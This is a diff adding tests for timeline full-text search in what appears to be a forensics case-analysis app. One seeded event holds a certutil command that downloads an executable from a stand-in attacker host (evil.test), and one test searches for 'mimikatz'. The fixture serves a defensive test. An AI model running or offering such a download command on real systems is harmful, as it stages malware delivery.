@@ -9,6 +9,7 @@ import { StateStore } from "../../src/analysis/stateStore.js";
 import { CommentsStore } from "../../src/analysis/comments.js";
 import { JobManager } from "../../src/analysis/jobManager.js";
 import { MockProvider } from "../../src/providers/provider.js";
+import { emptyState } from "../../src/analysis/stateTypes.js";
 
 const PASSWORD = "correct horse battery staple";
 
@@ -699,5 +700,59 @@ describe("POST /cases/:id/delete — cleanup failures do not misreport the delet
     };
     await request(app).post("/cases/DEL-BOTH/delete").send({ archiveFirst: "none" });
     expect(await store.listRetiredCaseIds()).toEqual(["DEL-BOTH"]);
+  });
+});
+
+// #928: GET /cases/:id/state?q=<term> searches the whole stored timeline, not the page it returns.
+describe("GET /cases/:id/state full-text search (#928)", () => {
+  async function seedTimeline(caseId: string) {
+    const root = await mkdtemp(join(tmpdir(), "dfir-state-search-"));
+    const store = new CaseStore(root);
+    const stateStore = new StateStore(store);
+    const commentsStore = new CommentsStore(store);
+    const app = createApp(store, { stateStore, commentsStore });
+    await seedCase(app, caseId, "search");
+
+    const state = emptyState(caseId);
+    state.forensicTimeline = Array.from({ length: 300 }, (_, index) => ({
+      id: `e${index}`,
+      timestamp: "2026-02-02T03:04:05.000Z",
+      description: "routine logon",
+      severity: "Low" as const,
+      mitreTechniques: [],
+      relatedFindingIds: [],
+      sourceScreenshots: [],
+      sources: [],
+      ...(index === 250 ? { message: "certutil -urlcache -f http://evil.test/p.exe" } : {}),
+    }));
+    await stateStore.save(state);
+    return app;
+  }
+
+  it("returns only matching events, and counts only matches", async () => {
+    const app = await seedTimeline("SRCH-1");
+    const res = await request(app).get("/cases/SRCH-1/state").query({ q: "certutil" });
+    expect(res.status).toBe(200);
+    expect(res.body.forensicTimeline.map((e: { id: string }) => e.id)).toEqual(["e250"]);
+    expect(res.body.forensicTimelineTotal).toBe(1);
+  });
+
+  it("without q the timeline is unfiltered", async () => {
+    const app = await seedTimeline("SRCH-2");
+    const res = await request(app).get("/cases/SRCH-2/state");
+    expect(res.body.forensicTimelineTotal).toBe(300);
+  });
+
+  it("a blank q is not a filter", async () => {
+    const app = await seedTimeline("SRCH-3");
+    const res = await request(app).get("/cases/SRCH-3/state").query({ q: "   " });
+    expect(res.body.forensicTimelineTotal).toBe(300);
+  });
+
+  it("a term nothing carries returns an empty timeline rather than the whole case", async () => {
+    const app = await seedTimeline("SRCH-4");
+    const res = await request(app).get("/cases/SRCH-4/state").query({ q: "mimikatz" });
+    expect(res.body.forensicTimeline).toEqual([]);
+    expect(res.body.forensicTimelineTotal).toBe(0);
   });
 });
